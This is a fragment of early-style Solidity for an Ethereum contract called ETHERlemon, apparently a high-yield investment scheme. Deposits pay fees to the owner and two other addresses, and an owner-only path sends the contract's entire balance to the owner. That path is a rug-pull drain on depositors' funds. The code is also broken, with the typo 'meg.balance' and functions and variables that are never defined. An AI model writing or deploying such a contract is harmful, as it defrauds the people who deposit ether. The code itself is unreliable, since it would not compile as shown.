function ETHERlemon() {
    owner = msg.sender;
}

function() {
    enter();
}

function enter() {
    if (msg.sender == owner) {
        UpdatePay();
    } else {
        feecounter += msg.value / 10;
        owner.send(feecounter / 2);
        ipyh.send((feecounter / 2) / 2);
        hyip.send((feecounter / 2) / 2);
        feecounter = 0;

        if (msg.value == (1 ether) / 10) {
            canPay();
        } else {
            msg.sender.send(msg.value - msg.value / 10);
        }
    }
}

function UpdatePay() _onlyowner {
    msg.sender.send(meg.balance);
}
